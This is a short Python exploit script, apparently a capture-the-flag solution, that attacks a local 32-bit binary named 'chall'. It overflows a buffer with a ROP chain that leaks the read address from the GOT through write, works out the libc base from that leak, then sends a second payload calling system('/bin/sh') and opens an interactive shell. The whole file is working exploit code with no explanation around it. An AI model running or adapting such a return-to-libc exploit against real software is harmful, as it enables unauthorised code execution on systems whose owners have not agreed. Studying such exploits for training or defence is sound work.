from roppy import *


#term.init()
p = process("./chall")
elf = ELF("chall")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
gadget = 0x080484e9 #  pop esi; pop edi; pop ebp; ret;
context.log_level = 'info'
#payload = b"A"*13
#payload += p32(elf.plt('write'))
#payload += p32(gadget)
#payload += p32(1)
#payload += p32(elf.got('read'))
#payload += p32(0x8)
#payload += p32(elf.function('main'))
#pause()

p.sendline(b'AAAAAAAAAAAAA \x83\x04\x08\xe9\x84\x04\x08\x01\x00\x00\x00\x0c\xa0\x04\x08\x08\x00\x00\x00Y\x84\x04\x08')


read_leaked = u32(p.recv()[:4].strip().ljust(4, b"\x00"))

log.info("read@libc: "+hex(read_leaked))

libc.address = read_leaked - libc.function('read')


system = libc.function('system')
bin_sh = libc.search(b"/bin/sh\x00")
log.info("system@libc: "+hex(system))
log.info("binsh@libc: "+hex(bin_sh))
payload = b"A"*13
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendline(payload)

p.interactive()
